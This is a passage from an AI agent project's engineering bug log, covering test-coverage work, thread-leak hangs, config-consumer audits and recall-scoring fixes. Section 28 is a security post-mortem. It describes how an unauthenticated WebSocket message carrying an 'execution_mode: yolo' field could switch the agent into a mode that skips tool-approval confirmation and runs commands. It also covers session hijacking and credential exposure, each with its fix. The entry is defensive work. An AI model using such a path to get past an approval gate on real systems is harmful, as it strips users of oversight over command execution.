had **no stop()** — one resident `time.sleep(1)` thread per instance; after tests created multiple temp stores, pytest hung on exit
(INTERNALERROR Timeout, leftover `_flush_loop` threads). Added `stop()` (set flag + join + flush + close connections),
called by test_management_api's `api_log` fixture teardown.

**Lessons:** ① For full-suite hangs at exit: check pytest INTERNALERROR thread stacks first — resident daemon threads
(sleep loops) are classic leak sources; any class starting threads in `__init__` must provide `stop()`; ② avoid duplicating existing test basenames
(`test_identity_loader` name clash caused a collection error).

**Coverage gains:** web_search (8%), ModelRunnerManager (0%), identity_loader (0%), values_store (0%),
causal_tree (12%) critical paths covered.

### 27.12 Continued coverage: tool_discovery / context_budget / management causal-graph endpoints

**New tests (full suite 1657 → 1685 green):**
- `test_tool_discovery.py` (9) — tool discovery engine (previously 0%): exact-name/keyword/tag/category relevance,
  sorting/limit/min_relevance, get by category/tag, task recommendation (calc hit).
- `test_context_budget.py` (14) — context budgeting (previously 0%): allocate tiers (few/many/medium tools),
  token estimation (CN/EN), tool-description token heuristics, simplification decisions, memory/dialog-turn recommendations, role-based budgets.
- `test_management_api_ext.py` +5 — causal-graph endpoints: graph data (nodes/edges/stats),
  metrics, node details (predecessors/successors/related events/AppError when missing), causal tree expansion.

**Coverage gains:** tool_discovery (0%), context_budget (0%), management causal-graph endpoints (the original 41
zero-coverage endpoints keep shrinking).

**Lesson:** For token-estimation heuristics (3 chars/token CN, 4 chars/token EN), compute exact expected values from the formula in tests;
don't assert size relationships by intuition (70 Chinese characters actually cost more tokens than 100 English ones).

### 27.13 Continued coverage: remaining management endpoints (database/info-process/perception)

**New tests (full suite 1685 → 1688 green):**
- `test_management_api_ext.py` +3 — `/database` (disk_cache stats + sqlite table info),
  `/info-process` (ImageAnalyzer/SpeechRecognizer status, mocked classes), `/perception` (perception system status,
  started→running).
- At this point only a handful of management's 41 zero-coverage endpoints remain (start/stop_perception, memory event CRUD,
  skills already covered, clear_memory, etc.).

**Note (Python pitfall):** The package attribute of `modules.database.disk_cache` is shadowed by the `disk_cache` instance in its `__init__` —
`import modules.database.disk_cache as dc` binds the **DiskCache instance**, not the module
(`dc` has no `disk_cache` attribute). Tests should do `from modules.database.disk_cache import disk_cache` to grab the instance
then monkeypatch methods.

**Coverage gains:** management endpoints nearly all green; combined with earlier rounds, previously-0% modules (utils/providers/identity_loader/
values_store/tool_discovery/context_budget/ModelRunnerManager) are all covered now.

### 27.14 Continued coverage: memory event CRUD + ModelRunner methods

**New tests (full suite 1688 → 1707 green):**
- `test_management_api_ext.py` +6 — memory event CRUD (create/get/update/delete, NOT_FOUND when missing, clear_memory wipes),
  deprecated tool-skills endpoint. All 41 zero-coverage management endpoints now covered.
- `test_model_runner_methods.py` (13) — ModelRunner previously had 14 uncovered methods; this round covers core:
  `_has_required_tool_args`/`_missing_required_tool_args` (calc schema required-param validation: all params/missing params/
  nulls/unknown tool), `_build_tool_guard_prompt` (minimal for few tools / detailed for many / forced detailed for large tier),
  `_build_tool_prompt_section` (placeholder empty string), `_build_prompt` (task description/identity/role boundaries/guidance/
  skill stacking only for large tier).

**Lesson:** When asserting prompt-method output, first confirm the actual wording (`【工具调用硬性规则】` not `【工具调用规则】`) —
for `in` substring assertions, ground them in real production output rather than guessing from method names.

**Coverage gains:** all management endpoints covered; ModelRunner methods down from 14 uncovered to a few heavy ones
(`_wait_for_user_response`/`_run_runtime_expert` need real inference chains).

### 27.15 Continued coverage: ModelRunner interactive-wait methods

**New tests (full suite 1707 → 1713 green, `test_model_runner_methods.py` +6):**
- `_wait_for_user_response`/`resolve_user_response` — future wait → resolve fills and returns, pending cleaned up,
  timeout returns `{"timeout": True}`, unknown request_id doesn't error
- `_handle_ask_user_intent` — after resolve returns `【用户意图】用户的回答：...`
- `_handle_mode_change_request` — approve (`ToolSecurityGate.resolve_review` resolution → switches
  `settings.EXECUTION_MODE` and restores) and reject (returns rejection text)

**Lessons:** ① For interactive methods (future waits) use the "task + sleep to suspension point + resolve + wait_for" pattern;
② `_handle_ask_user_intent` reads `result["answer"]`, not `response` — resolve payload field names must match the consumer;
③ `ToolSecurityGate._pending_reviews` is a **class attribute**; module-level `tsg._pending_reviews` can't reach it.

**Coverage gains:** ModelRunner heavy interactive methods (approvals/question waits) covered; remainder tiny
(`_run_runtime_expert`, `_on_wakeup_message` etc. need full runtime chains).

### 27.16 Wrap-up: remaining ModelRunner methods + doc structure fixes

**New tests (full suite 1713 → 1721 green, `test_model_runner_methods.py` +8):**
- `_format_messages_for_context` (ChatMessage/dicts/dict-content thinking_result extraction/recent-20 truncation)
- `_consume_guidance` (pending guidance consumed → `thinker.add_external_prompt`)
- `_check_messages` (mocked bus.receive messages → normalized fields)
- `_on_wakeup_message` (sets wakeup_event)

At this point ModelRunner's previously-uncovered 14 methods leave only `_run_runtime_expert`/`_build_runner_prompt` (need full runtime chains).

**Doc structure fixes:**
- §21 (outreach bypass) title was originally concatenated at §18's end (missing newline) + out of order (before §19/§20) — split onto its own lines and moved after §20, restoring 18→19→20→21→22 order.
- §25's "default behavior unchanged (backward compatible)" has since been superseded by making generate's parameter required — annotation added pointing to §27.8.
- Spot-checked §26/§27.4/§27.8/§27.10/§27.11 records against actual code (validate_attachments, fail-closed,
  providers wiring, pipe-to-shell regex, ApiLogStore.stop) — consistent.

### 27.17 Chatonly-mode persona settings had no effect (frontend settings ignored)

**Symptom:** After setting a persona for a custom orchestrator agent on the Orchestration page, the system prompt stayed completely unchanged in **chatonly mode**.

**Root cause:** Chatonly is a single persona — `chat_light/prompt_composer.py` hardcoded reading only the **`orchestrator`** role's
`get_persona("orchestrator")`/`get_system_override("orchestrator")`. But custom agents (tier=large) from the Orchestration page store personas under **custom role keys** in `personas.yaml` (e.g. `'123'`), not under `orchestrator` →
chatonly couldn't read them → settings ineffective. Agent mode reads per-role keys so it worked.

**Fix (`chat_light/prompt_composer.py`):** when `orchestrator` has no custom persona, fall back to the user-defined
**large-tier orchestrator agent** persona (iterate `get_custom_agents()` for the first tier=large entry with a persona).
`system_override` priority unchanged (used directly when non-empty).

**Verification:** Added 2 tests (`test_chat_light_prompt.py`): orchestrator without persona → falls back to custom large-agent persona effectively; orchestrator with persona → takes priority, no fallback. Full suite 1723 pass.

**Lesson:** Another occurrence of §18/§22's "config written but consumer doesn't read" pattern — frontend saves config to slot A (custom role),
backend consumer reads slot B (orchestrator); mismatched keys across ends. When debugging "settings have no effect", first map frontend-saved keys against backend-read
keys, then verify the real chain (`set_persona → build_system` output).

### 27.18 Custom agents never wired into scheduling ("saved but unread"; §22 consumer-audit blind spot)

**Symptom:** After "adding" a custom agent on the Orchestration page (tier/model_id/persona saved), agent mode couldn't actually schedule it —
only chatonly mode (§27.17 fix) read large-tier custom agent personas; agent mode's `start_runner` rejected outright.

**Root cause:** `identity.py::get_identities()` loaded identity templates only from `config/prompts/roles.yaml`,
**never merging personas.yaml custom agents**. And agent-mode scheduling `ModelRunnerManager.start_runner`
rejects unknown identities via `identity_key not in get_identities()` → custom agents created on the Orchestration page aren't in the identity table
→ can never start. The `model_id` field also had no consumer (model instances still created per-tier default).

**Why tests missed it:** ① `get_identities` fully mocked, never asserting the "should contain custom agents" contract;
② the `create_custom_agent` endpoint lives in `api/main.py` (not `modules/management/api.py`) and fell outside §27.x endpoint audit scope — zero tests;
③ `start_runner` unknown-identity tests used fake identity dicts, masking that real custom identities were absent.
**Essence: another instance of §18/§22's "saved but unread", and §22's consumer audit only covered config keys, not extending to
"whether objects created by the frontend (agents) are consumed by scheduling".**

**Fix:** `get_identities()` merges personas.yaml custom agents (converted to identity-template structures);
model creation honors custom agent `model_id`/tier; scheduling layer can start custom roles.

**Lesson:** Debugging "saved but unread" requires tracing **every frontend write-entry point** (not just config keys) to backend consumers —
Orchestration page additions/personas/permissions/model params/activation toggles all need verifying that "what was saved really gets read".

### 27.19 Full consumer-audit fixes (frontend/backend "saved but unread" cleanup)

Extending §22's consumer audit per §27.18 to **all frontend write operations** (40+ endpoints → saved data → scheduling consumers),
fixed 5 issues:

1. **Shared-dict pollution (identity)**: `_load_from_yaml` mutated the shared dict from `loader.load("roles")` directly;
   custom-agent merges left residue polluting subsequent loads → shallow copy.
2. **agent_active toggle unconsumed by scheduling**: Orchestration toggles only saved/displayed; `start_runner` never checked →
   disabled agents still started. `start_runner` now rejects when `get_agent_active is False`.
3. **persona-presets read-side 500**: `get_persona_presets` wrote `for k,v in presets.values()` (unpacking a 3-key dict crashes)
   → presets could never be listed/applied after saving. Changed to `presets.items()`.
4. **Custom agent personas absent from system prompt**: `config/prompts/composer._get_role` read only roles.yaml;
   custom roles fell back to orchestrator clone → now looked up from `get_identities()` (including Orchestration custom agents).
5. **expertise comma-string split into chars**: identity merge stored expertise strings as-is; `from_template`'s
   `list(...)` split into single chars → convert comma strings to lists at merge time.
6. **LOG_LEVEL decorative**: `setup_logger` hardcoded "INFO", Settings LOG_LEVEL changes did nothing → default now reads
   `settings.LOG_LEVEL`.

**Correctly consumed (no change needed, for reference)**: personas/system_overrides/role_tools/model_params, skills
enabled/forced/role-skills, tools enabled (visibility), scheduled_tasks prompt/outreach, todos, memory-store switching.

**Could be strengthened (not decorative)**: tools enabled filters visibility only; `tool_security_gate` execution path doesn't block direct invocation of disabled tools.

**Verification:** New `test_custom_agent.py` (11 tests: identity merge/deletion invalidation/endpoints/scheduling/activation toggle/preset read-side/
composer custom persona/LOG_LEVEL); full suite 1733 pass.

## 28. Unauthenticated WebSocket + 0.0.0.0 binding + execution_mode injection + approval-future disconnect leak (security audit critical)

**Symptom:** A full security audit found three high/medium-severity problems:

1. **WS completely unauthenticated (HIGH)**: HTTP middleware doesn't cover WebSocket (comment says so in `api/main.py`); any client reaching port 8080 could freely connect `/stream/ws/{any session_id}`; connecting with the same session_id would **displace the original connection and hijack the message stream** (session takeover).
2. **Default bind 0.0.0.0 (HIGH)**: `main.py`/`start_all.py`/`autostart_launcher.py`/`Dockerfile` all listened on every interface — any LAN device could connect directly.
3. **WS message could inject global execution mode (HIGH)**: including `"execution_mode":"yolo"` in input messages let `api_stream.websocket_chat` directly `object.__setattr__(settings, "EXECUTION_MODE", ...)` **globally effective**, bypassing PUT /config authentication — an attacker could remotely execute tools (incl. exec_command) in yolo mode (skipping confirmation).
4. **Approval future disconnect leak + global timer freeze (MEDIUM)**: after the user closed the frontend, futures in `ToolSecurityGate._pending_reviews` / `ModelRunner._pending_user_responses` were never resolved; `asyncio.wait_for(future, timeout=None)` suspended forever, and once suspended `Suspension` never resumed → **the whole system's timers froze**.
5. **API key persisted to localStorage (MEDIUM)**: `frontend/src/api.js` stored keys in localStorage (pattern recorded in §17.7, reintroduced during Vue refactor).

**Fixes:**
1. **WS handshake auth**: new `api_stream._ws_auth_ok()` — allows when `SIMPLE_API_KEY` unset (dev mode); when set, validates `X-API-Key` header or `?api_key=` query param (hmac constant-time compare; either matching passes). Both `chat_gateway.websocket_chat` (actually mounted entry) and `api_stream.websocket_chat` (defense in depth) validate before accept, failing with `close(4401)`. CLI (aiohttp) sends the header; browsers can't set headers on WebSocket, so frontend `ws/client.js` appends `?api_key=`.
2. **Default bind 127.0.0.1**: `main.py`/`start_all.py`/`autostart_launcher.py` switched to `SERVER_HOST` env (default `127.0.0.1`); docker-compose sets `SERVER_HOST=0.0.0.0` explicitly (container must listen on eth0 for docker-proxy forwarding; host already restricts exposure via `127.0.0.1:8080:8080`).
3. **Removed WS execution_mode injection**: `api_stream.websocket_chat` no longer reads `execution_mode` from messages; CLI `send_input` no longer attaches it. Mode switching goes uniformly through `PUT /config/EXECUTION_MODE` (CLI `_set_execution_mode` already implements this, authenticated).
4. **Approval/interaction session association + disconnect cleanup**: `ToolSecurityGate` gains `_pending_review_sessions` (request_id→session_id) + `reject_session_reviews(session_id)`; `session_id` threaded through `check/_check_impl/_check_high_risk/_check_user_review`; ModelRunner's gate.check and `_handle_mode_change_request` associate sessions; new `ModelRunner.reject_session_user_responses(session_id)` clears pending `ask_user_intent`. `api_stream.websocket_chat` finally calls both batch-rejects on disconnect — affecting only the disconnected session without collateral damage, `Suspension` restored, thinking continues.
5. **API key memory-only**: `frontend/src/api.js` removes localStorage/sessionStorage reads/writes; after refresh `autoDetectApiKey()` pulls from `/config/api-key` automatically (production returns plaintext only over loopback).
6. **Session-takeover protection**: `ConnectionManager.connect` closes the old connection of the same session before registering the new one (code 4000).

**Verification:** 15 new tests — `test_ws_auth.py` (6 _ws_auth_ok units), `test_chat_gateway.py` +3 (no key rejected/wrong key rejected/correct key passes), `test_toolgate.py` adds `TestRejectSessionReviews` (3: rejects only target session/check passes session label/unknown session noop), `test_reject_session_interactions.py` (3: cleanup/skips completed/cancelled notice); full unit 1378 + frontend 5 + `vite build` all green.

**Lessons:**
1. **HTTP auth middleware doesn't cover WebSocket** — every WS endpoint needs separate handshake auth, validated **before** `accept()` (once accepted, you can't refuse);
2. **Never inject switches/modes through unauthenticated channels** — config writes inside WS messages are bypasses; converge on authenticated PUT /config;
3. **Indefinite waits (timeout=None) must pair with disconnect cleanup** — after §10 made approvals wait indefinitely, frontend disconnect meant permanent suspension + global Suspension freeze; interactive futures must register ownership (session_id) and be batch-rejected on disconnect;
4. **Local services default-bind 127.0.0.1**; expose to LAN explicitly via SERVER_HOST=0.0.0.0 (except inside Docker containers, which need host port mapping);
5. **Sensitive credentials live in memory only** — localStorage's XSS theft surface is too large; auto-fetch + in-memory holding suffices for the no-reentry experience.

### 27.20 Backend test completion (coverage 57% → 60%) + 1 real bug fixed

**Added (~130 tests, full suite 1721 → 1859 green):**
- **0% modules**: `test_ocr_utils.py` (OCR engine three branches/singleton), `infra.model.interface` re-export
- **agent tools**: value_tools (12), web_fetch (SSRF/URL/methods/timeouts 9), open_app (touchpoint/subprocess 7),
  plan_tools/security_tools/file_history_tools (14), dev_tools (AST/deps 13), ai_tools (code validation/create/delete 18),
  exec_command execution paths (7), memory_matcher (semantic/keyword/time/importance 15)
- **model clients**: `test_model_client_chat.py` (chat success/tools/non-200/timeout retries, generate reasoning fallback/anthropic 9)
- **local vision**: image_analyzer `_analyze_qwen_vl`/`_analyze_mlx_vlm`/UI degradation

**1 real bug fixed:** `image_analyzer.detect_ui_elements`'s else branch called the **nonexistent method
`_detect_ui_mock`** (AttributeError when no vision backend available) → added degradation method returning empty results. Test-covered.

**Stability:** pytest global timeout 10s → 20s (under full-suite load several very fast tests sporadically flaked on timeout; alone they passed in 0.9s).
Performance test class `TestPerformance` marked `slow` (machine-load dependent, excluded by default).

**Coverage:** 57% → 60% (miss -335 lines). Remaining low coverage concentrates in modules needing real environments/heavy mocks:
api_stream (35%), model_runner (45%), image_analyzer (23%→incl. local vision), speech_recognizer/hardware_input/
mouse_keyboard/perception_tools/cdp_scanner (external hardware dependencies). High-risk items needing confirmation see
`docs/BUGS_REQUIRING_CONFIRMATION.md` (no new high-risk behavior changes this round; everything found was ordinary bugs fixed directly).

### 27.21 Backend test completion (continued): coverage 60% → 61%

**New tests (full suite 1859 → 1895 green):**
- `test_speech_recognizer.py` (6) — whisper recognition/degradation mock/confidence/file/Base64 (ImportError behavior when whisper missing)
- `test_hardware_controller.py` (14) — PyAutoGUI wrappers: move/click/scroll/drag/position/key/input/hotkey/screenshot (incl. screenshot-disabled branch)
- `test_mouse_external.py` (9) — external_api SSRF/GET/POST/timeout + mouse_keyboard move/click/keyboard
- `test_perception_cdp.py` (7) — cdp_scanner DOM parsing (buttons/placeholders/depth/text skip) + transcribe_audio + understand_screen degradation
**Stability fix:** All flaky screenshot tests were rewritten to mock `utils.screen_capture` (which returns None under full real-pyautogui load).

**Coverage:** 60% → 61% (cumulative 57% → 61%, misses down from 9601 → 9090, -511 lines).
**Cumulative additions**: 1721 → 1895 items (+174). Remaining low coverage: `api_stream` (35%), `model_runner` (45%),
parts of `ai_tools`/`tools`, `output_system`, deep paths of `management` — these require heavy mocks or real environments.

### 27.22 Backend test completion (cont.): api_stream auth/identity/memory extraction

**New tests (full suite 1895 → 1901 all green, `test_api_stream_core.py` gains 6 items):**
- `_ws_auth_ok` (dev-mode passthrough / header-correct-but-wrong / correct query)
- `_resolve_identity_name` (cache / strip _001 suffix / empty)
- `_post_task_extraction` (mock EventReducer extraction success / conversation too short to extract)

**Coverage:** 61% (`api_stream` 35% → 39%). Cumulative 57% → 61%, full suite 1721 → 1901 (+180 items).
Remaining low coverage: `model_runner` (45%, 1590 lines), `ai_tools`/`output_system`/`management` deep paths,
remaining tools branches — these require heavy mocks (full run chain) or real environments.

### 27.23 Backend test completion (cont.): model_runner/output_system/ai_tools

**New tests (full suite 1901 → 1922 all green):**
- `test_model_runner_methods.py` gains 5 items — `_supports_native_tool_chat` (static check),
  `_build_time_context` (time/object), `_push_reasoning` (reasoning pushed / not pushed when empty)
- `test_output_system.py` (7 items) — text/speech (TTS success/disabled)/mouse/keyboard endpoints (mocking the underlying layer)
- `test_ai_tools.py` gains 4 items — edit_tool (success/missing name/nonexistent) + `_add/_remove_persisted`
- `test_api_stream_core.py` gains 6 items (§27.22)

**Stability fix:** Under pytest, mocking `_visible_tool_whitelist` via dependency injection was unstable (module attribute shadowing),
and the method merely forwards to ToolPermissionController (tested separately) → removed that test.

**Coverage:** 61% (cumulative 57% → 61%, misses -619 lines). Full suite 1721 → 1922 (+201 items).
Remaining low coverage is concentrated in **areas requiring real run chains/heavy mocks**: remaining `model_runner` methods
(the full `_generate_with_tools` loop, `_run_task`/_think_loop), the complete `api_stream` WS stream, `output_system` deep paths,
real hardware/screen/voice branches.

### 27.24 Backend test completion (cont.): tool-loop branches + whitelist commands

**New tests (full suite 1922 → 1932 all green):**
- `test_model_runner.py` gains 3 items — `_generate_with_tools` expert direct output (no tools + text),
  supervisor plain-text rejection retry (injection verified via chat_calls>=3), missing-parameter interception (calc never executed)
- `test_exec_command_safety.py` gains 6 items — `run_command` whitelist (empty/not on whitelist/on whitelist/
  shlex parse failure), `run_script` (empty/extreme interception/success)

**Coverage:** 61% (cumulative misses -645 lines, 57% → 61%). Full suite 1721 → 1932 (+211 items).
Remaining low coverage requires **complete run chains/real environments**: full `model_runner` loops (_run_task/_think_loop),
`api_stream` WS streaming, real hardware/screen/voice branches — pure unit tests yield limited gains here.

### 27.25 Backend test completion (cont.): _generate retry/fallback + system prompt building

**New tests (full suite 1932 → 1936 all green, `test_model_runner.py` gains 4 items):**
- `_generate` frontend unreachable → skips LLM (returns "[系统] 前端连接已断开")
- `_generate` native-tool client → routes through `_generate_with_tools`
- `_generate` client without native tools → falls back to legacy `generate()`
- `_build_system_prompt_for_mode` prepends conversation history (mock PromptComposer)

**Coverage:** 61% (cumulative misses -700+ lines). Full suite 1721 → 1936 (+215 items).
Remaining low coverage: `model_runner._run_task/_think_loop` (full orchestration loops), `api_stream` WS streaming,
real hardware/screen/voice branches — marginal benefit from pure unit tests is low.

### 27.26 Backend test completion (cont.): _run_task lifecycle + RuntimeExpert

**New tests (full suite 1936 → 1940 all green, `test_model_runner.py` gains 4 items):**
- `_run_task` normal thinking → finally-block cleans up manager registrations (runners/count)
- `_run_task` exception → status=error + details
- `_run_task` cancellation → status=completed
- `_run_runtime_expert` on_demand → instantiation + run_cli_mode

**Coverage:** 61% (cumulative misses -730+ lines). Full suite 1721 → 1940 (+219 items).
Remaining low coverage: the full `_think_loop` orchestration loop, `api_stream` WS streaming, real hardware/screen/voice — requires full run-chain mocks.

---

## 29. config/settings.py missing `import sys` → latent NameError (backend)

**Symptom:** When `~/.cortex/settings.json` does not exist, `_ensure_user_config`/`_apply_user_config` and 10 other spots use `sys.stderr`, but the module never does `import sys` → the first run triggers a `NameError`.

**Root cause:** `settings.py` has only `import os` at the top; multiple `print(..., file=sys.stderr)` calls rely on implicit sys. Unit tests did not expose it only because an autouse fixture injected sys.

**Fix:** Add `import sys` to the module top (`config/settings.py`).

**How found:** While boosting coverage of `config/settings.py` (61%→100%), tests worked around it by injecting sys, exposing the real gap.

---

## 30. ScreenMonitor background-thread leftovers → random hangs in full pytest runs (backend/testing)

**Symptom:** Full-suite tests randomly hit INTERNALERROR/hangs (pytest-timeout fired at 20s but the session aborted); faulthandler dumps showed a thread stuck in `screen_monitor_source.py _read_stdout_loop` endlessly calling a mocked readline, while the main thread was stuck in pytest capture `readouterr`.

**Root cause:** The reader background thread (non-daemon) started by `ScreenMonitorSource._ensure_process` kept running after a test finished unless stop was called explicitly; tests used `__new__` to bypass `__init__` (instance not in the registry, so it cannot be cleaned up) + mocked out `_close_process` (`_reader_running` stays True, so the thread never stops). The leftover thread held pytest capture fds → the next test's capture read blocked (fd leak + mock-induced deadlock).

**Fix (three layers):**
1. Production code: add class-level `weakref.WeakSet` active-instance registries to `ScreenMonitorSource`/`ScreenDiffSource`; `stop()` unregisters
2. conftest autouse fixture `_stop_background_sources` uniformly stops leftover instances
3. Test corrections: `_source` registers manually + no longer mocks `_close_process`

**Verification:** The combination that previously always hung now passes stably 5/5; the full suite exits normally.

**Similar-issue sweep:** `setup.py` (window_detector), `PerceptionEventBus`, and the voice/hotkey/ocr detectors all had non-daemon background threads; all were added to the weakref registry + unified conftest cleanup.

---

## 31. test_detect_text OCR ordering pollution — sys.modules set to None at module level (backend/testing)

**Symptom:** In full-suite runs, `test_screen_monitor_server.py::test_detect_text` failed sporadically; passed when run alone.

**Root cause:** `test_mcp_screen_monitor.py` set `sys.modules["rapidocr_onnxruntime"] = None` at module level, permanently polluting (to prevent loading real OCR); subsequent tests importing `screen_monitor_server` ended up with `_ocr` as None, so the `extract_text=True` branch never ran → assertion found no text.

**Fix:** `test_detect_text` switched to monkeypatch-injecting a fake OCR (temporarily replacing `sms._ocr`), no longer relying on module-level pollution.

**Lesson:** Module-level `sys.modules[X] = None` pollutes the entire test process; use monkeypatch/local injection instead.

---

## 32. BytesIO internal buffer invisible to pympler — leak-detection blind spot (test infra)

**Symptom:** In the leak-detection verification suite, the "file-handle leak" test (accumulating `io.BytesIO`) under-reported — pympler only counts Python objects; `BytesIO`'s C-level buffer is not counted toward size.

**Root cause:** `pympler.muppy.get_size` counts only the object itself for `_io.BytesIO`; its internal bytes buffer cannot be attributed.

**Fix:** The leak tests also accumulate content bytes (`_FILE_CONTENTS` explicitly references the bytes) so muppy can measure them.

**Lesson:** pympler byte sampling is blind to "pure C buffers" (BytesIO/certain extensions); the leak-test suite (tests/leak/) exists precisely to expose such detection blind spots.

---

## 33. Local proxy fake-ip resolves example.com to a private IP → SSRF protection false positive (test env)

**Symptom:** Locally (macOS + proxy software such as Surge/Clash), DNS resolved example.com to `198.18.0.50` (fake-ip range), which `_is_private_ip` judged private → two SSRF-related tests failed (`test_is_private_ip_public`, `test_web_fetch_bad_method`). CI (ubuntu resolving public IPs normally) was unaffected.

**Fix:** Tests mock DNS/private-IP checks:
- `test_is_private_ip_public` mocks `socket.getaddrinfo` to return a fixed public IP
- `test_web_fetch_bad_method` monkeypatches `_is_private_ip` to return False

**Lesson:** Tests depending on real DNS are unreliable behind proxies; mock the system boundary instead.

---

## 34. test_api version assertion outdated (2.0.0 vs actual version) (testing)

**Symptom:** `tests/integration/test_api.py::test_root_returns_app_info` asserted `version == "2.0.0"`, but the project had already released v2.1.1 → assertion failed.

**Fix:** Changed to read `cortex.version.__version__` and compare dynamically; no more hardcoding.

---

## 35. macOS forbids resource.setrlimit(RLIMIT_AS) below current usage (test infra)

**Symptom:** While implementing "auto-kill on memory ceiling", capping the process address space with `RLIMIT_AS` at 100MB raised `current limit exceeds maximum limit` (the current process address space already exceeded it).

**Root cause:** On macOS `RLIMIT_AS` caps total address space and **cannot be set below current usage**; after loading libraries, a Python process's address space is already large.

**Solution:** Abandoned RLIMIT_AS in favor of a **watchdog thread** + periodic sampling via `psutil.Process().memory_info().rss`, calling `os._exit(1)` over limit (conftest `_mem_watchdog`, default 4096MB, tunable via `CORTEX_TEST_MEM_LIMIT_MB`).

---

## 36. sys.getallocatedobjects() removed in Python 3.13 (test infra)

**Symptom:** Leak-detection sampling using `sys.getallocatedobjects()` raised `AttributeError` (swallowed by try/except, leaving sampling points empty).

**Root cause:** The function was added in 3.8, deprecated since 3.11, removed in 3.13.

**Fix:** Switched to `len(gc.get_objects())` (object count), later upgraded further to `pympler.muppy.get_size` (real bytes).

---

## 37. EventStore.__del__ triggers a GC infinite loop on a fake faiss index (backend/testing)

**Symptom:** The original `test_event_store_ext.py` triggered an infinite GC loop in Python 3.13 after fixture teardown (stuck at 99.7% CPU).

**Root cause:** During cyclic GC, `EventStore.__del__` called `faiss.write_index` on an index already set to `None`/a fake one, raising a SWIG TypeError; GC retried endlessly.

**Fix:** Fixture teardown sets `_faiss_index` to None before calling `close()`, preventing `__del__` from touching the fake index during GC.


---

## 38. Systematic bug-document audit — 2 similar issues found and fixed

**Background:** Extracted root-cause patterns item by item from §1-37 and searched the codebase for similar issues.

**Audit scope and conclusions (most patterns handled correctly):**

| Pattern | Conclusion |
|---|---|
| §29 missing `import sys` | ✅ Nothing missed (every usage site of `sys.stderr/stdout` imports it) |
| §31 `sys.modules` set to None at module level | ⚠️ **Found 2 similar cases** → fixed |
| §34 hardcoded version assertions | ✅ All are fake data internal to tests, not project-version assertions |
| §24 event-loop self-lock inside a thread | ✅ frontend_channel/api_stream handled (comments explicitly avoid self-locking) |
| §30 background-thread leftovers | ✅ Fully addressed via weakref registry + conftest cleanup |
| §28 unauthenticated WS | ✅ chat_gateway has explicit `_ws_auth_ok` + 4401 rejection, covered by test_ws_auth |
| §21 proactive talk bypassing switches | ✅ trigger gate has 52 enabled/allowed tests, sufficient |
| §25 tool calls wrapped in persona | ✅ model_runner builds prompts uniformly via PromptComposer; tool-type calls use `_NEUTRAL_SYSTEM_PROMPT` |
| §37 `__del__` trap | ⚠️ **Found 1 similar case** → fixed |

**Similar bug 1 (§31 type):** `test_mcp_screen_diff.py` / `test_mcp_screen_monitor.py` set `sys.modules["rapidocr_onnxruntime"] = None` at module level, permanently polluting — conftest's `block_real_native_libs` already nulls it globally, making this redundant and preserving the "module-level pollution" anti-pattern.
**Fix:** Removed the module-level None assignments from both files; managed centrally by conftest. Verified 93 passed.

**Similar bug 2 (§37 type):** `causal_graph.CausalGraph.__del__` calls `self.close()` directly, with neither a `sys.is_finalizing()` guard nor try/except — during GC/interpreter shutdown, if builtins/modules are already torn down, an exception from `__del__` can trigger a GC infinite loop.
**Fix:** Aligned with the `event_store.__del__` guard pattern: `is_finalizing()` early return + try/except swallowing exceptions. Verified 171 passed.

**Takeaway:** Turning known bugs' root causes into a "searchable pattern" checklist (`sys.modules` pollution / unprotected `__del__` / missing imports / hardcoded versions) lets each audit batch-grep against the checklist and efficiently surface similar problems.

---

## 39. mypy fix introduces a regression: input_controller idempotency broken (backend)

**Symptom:** Full-suite run: `test_input_controller.py::test_init_idempotent_and_force` failed (`PyAutoGUIController` created 2 times, expected 1). Full suite: 5833 passed / 1 failed.

**Root cause:** During mypy auto-fixing, to eliminate the var-annotated error on `_initialized`, `self._initialized: bool = False` was added **before** the `hasattr(self, '_initialized')` check — the assignment resets the flag to False on every `__init__`, making the idempotency short-circuit `hasattr(...) and self._initialized and not force` always false → the second init recreated the controller.

**Fix:** Changed to **declaration-only, no assignment**: `self._initialized: bool` (satisfies mypy, no runtime reset), restoring the idempotency logic.

**Verification:** `test_input_controller.py` 24 passed; `mypy modules/output_system/input_controller.py` 0 errors.

**Lesson:** Automated type fixes (adding declarations/annotations) can introduce **behavior changes** — "adding an initialization line" ≠ "adding an annotation". After a mypy fix you must run **all tests for that file** (not just mypy 0 errors) to verify behavior is unchanged.

---

## 40. Deep recall lacks a noise guard → irrelevant queries fabricate causal chains (backend)

**Symptom:** For completely irrelevant queries such as `deep_recall("今天天气怎么样")` and `deep_recall("今天午饭吃什么")`, deep recall still **successfully** returned anchors + causal chains + corroborating events (e.g., anchoring "今天午饭吃什么" to 「人手不足」 and emitting 6 causal links). The evaluation matrix exposed it: `find_anchor_nodes` returned the anchor 「库存告急」 at 0.356 for a noise query.

**Root cause (two layers):**
1. `causal_graph.find_anchor_nodes` normalized semantic scores **by dividing by the max** (`sim / max_sem_score`) — even for irrelevant queries, the "semantically nearest" node gets lifted to a fixed `0.4×1.0=0.40`; picking the tallest among dwarfs;
2. `deep_recall` applied **no confidence floor at all** once it had anchors (depth_recall.py previously used `anchors[0][1]` directly), so it kept running even at 0.40.

**Fix:**
- `find_anchor_nodes`: semantic score switched to **absolute cosine similarity**; nodes without keyword hits must reach `abs_sem ≥ 0.30` (`_MIN_ANCHOR_SEMANTIC_SIMILARITY`) to become anchors, scored directly by `abs_sem`
- `deep_recall`: added the anchor confidence guard `CAUSAL_MIN_ANCHOR_CONFIDENCE`; below the threshold it falls back to shallow recall (`low_anchor_confidence`)
- Threshold calibration (measured): real semantic matches ≥0.53, chit-chat noise ≤0.37 → anchor floor set to **0.50** (`config/settings.py`)

**Verification:** All noise queries correctly fell back (`no_anchor_nodes` / `low_anchor_confidence`); zero false recalls of deep corroboration; normal-query anchor confidence went from inflated 1.0/0.40 to a realistic 0.90-0.94.

**Takeaway:** Normalized scores necessarily produce high scores when "the candidate set contains nothing relevant"; every scoring step must consider an **absolute threshold** rather than relative normalization.

---

## 41. Cross-scenario event pollution of corroboration + self-reinforcing incremental linking (backend)

**Symptom:** The "server down" event `ev_server_down` repeatedly leaked into the deep-recall corroboration events of the 「项目延期」 scenario; and once mixed in, `_incremental_update` **permanently linked it onto the delay causal node** (writing `causal_node_ids`), so the next run hit 1.0 directly — the false positive became self-reinforcing.

